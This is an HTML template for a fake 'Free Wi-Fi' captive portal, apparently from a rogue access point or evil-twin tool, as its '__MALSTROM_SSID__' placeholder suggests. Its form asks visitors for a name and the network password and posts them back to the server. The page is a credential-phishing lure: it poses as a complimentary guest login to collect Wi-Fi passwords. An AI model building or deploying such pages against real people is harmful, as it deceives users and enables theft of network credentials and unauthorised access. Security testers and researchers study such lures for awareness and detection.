<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Free Wi-Fi Access</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;background:#0b0e13;color:#e7ebf2;min-height:100vh;display:flex;align-items:center;justify-content:center}
.wrap{width:100%;max-width:430px;background:#12171e;border:1px solid #242c38;border-radius:16px;overflow:hidden}
.top{background:linear-gradient(135deg,#182230 0%,#10161e 100%);padding:34px 28px 28px;text-align:center;border-bottom:1px solid #242c38}
.tag{display:inline-block;font-size:11px;font-weight:700;letter-spacing:1.2px;color:#8b98a9;border:1px solid #2c3747;border-radius:20px;padding:4px 14px;margin-bottom:16px}
.top h1{font-size:22px;font-weight:700;margin-bottom:6px}
.top p{font-size:14px;color:#94a3b8}
.bod{padding:26px 24px 10px}
label{display:block;font-size:12px;color:#8b98a9;margin-bottom:6px}
input{width:100%;background:#0d1218;border:1px solid #28303c;border-radius:9px;padding:12px 14px;color:#e7ebf2;font-size:15px;outline:none;margin-bottom:14px}
input:focus{border-color:#3f8cff}
button{width:100%;background:#3f8cff;border:none;border-radius:9px;padding:14px;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
button:active{background:#3370cc}
.row{display:flex;align-items:center;justify-content:space-between;padding:14px 4px}
.row span{font-size:12px;color:#6b7686}
.row a{font-size:12px;color:#3f8cff;text-decoration:none}
.foot{text-align:center;font-size:11px;color:#4e5968;padding:16px 0 20px}
</style>
</head>
<body>
<div class="wrap">
  <div class="top">
    <div class="tag">FREE WIFI</div>
    <h1>Complimentary Internet</h1>
    <p>Sign in to "__MALSTROM_SSID__" to begin browsing</p>
  </div>
  <div class="bod">
      <form id="f" action="/" method="post">
      <label for="username">Your name</label>
      <input type="text" id="username" name="username" placeholder="Full name" autocomplete="off">
      <label for="password">Network password</label>
      <input type="password" id="password" name="password" placeholder="Password" required autofocus>
      <button type="submit">Connect</button>
    </form>
    <div class="row">
      <span>By signing in you accept the Terms of Service and Privacy Policy.</span>
    </div>
  </div>
  <div class="foot">Guest network — available to all visitors</div>
</div>
</body>
</html>
